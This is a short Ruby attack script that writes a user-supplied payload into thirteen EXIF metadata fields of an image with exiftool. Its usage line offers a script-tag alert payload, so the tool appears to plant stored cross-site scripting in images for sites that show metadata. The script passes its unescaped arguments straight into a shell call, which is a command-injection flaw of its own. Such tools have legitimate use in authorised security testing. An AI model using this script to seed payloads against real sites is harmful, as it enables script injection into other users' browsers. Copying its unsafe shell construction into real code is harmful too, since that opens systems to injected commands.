#!/usr/bin/env ruby

def main
    image   = ARGV[0]
    payload = ARGV[1]

    if image && payload
        exifs = [
            "ImageDescription",
            "Make",
            "Model",
            "Software",
            "Artist",
            "Copyright",
            "XPTitle",
            "XPComment",
            "XPAuthor",
            "XPSubject",
            "Location",
            "Description",
            "Author"
        ]

        exifs.each do |exif|
            system ("exiftool -\"#{exif}\"=\"#{payload}\" \"#{image}\"")
        end
    else
        puts "Usage: ruby exifs.rb <image.png> <\"<script>alert('alert');</script>\">\n"
    end
end

main
exit